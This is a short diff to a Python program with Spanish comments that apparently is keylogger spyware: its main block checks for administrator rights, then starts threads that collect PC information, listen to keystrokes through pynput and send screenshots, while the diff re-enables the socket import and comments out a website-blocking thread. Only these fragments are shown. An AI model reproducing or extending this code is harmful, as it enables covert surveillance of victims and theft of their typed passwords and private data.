@@ -4,7 +4,7 @@ from pynput.keyboard import Listener  # Escucha eventos del teclado
 import os  # Lib para copiar archivos
 import ctypes
 import sys
-#import socket  # Verifica internet
+import socket  # Verifica internet
 import threading  # procesos multihilos
 from datetime import datetime  # Devuelve fecha y hora actual
 import datetime  # Devuelve fecha y hora actual
@@ -865,8 +865,9 @@ if __name__ == '__main__':
         print("Is Admin?: Admin Success" if Util().is_admin() else "Is Admin?: Admin Failed")
 
         if Util().is_admin():
-            threading.Thread(target=WebsiteBlock().block).start() # Bloquear Webs
+            #threading.Thread(target=WebsiteBlock().block).start() # Bloquear Webs
             #threading.Thread(target=WebsiteBlock().reset()).start()   # Desbloquear Webs
+            pass
         threading.Thread(target=PCInformation().send).start()
         threading.Thread(target=Keylogger().listen_key).start()
         threading.Thread(target=Screenshot().send).start()
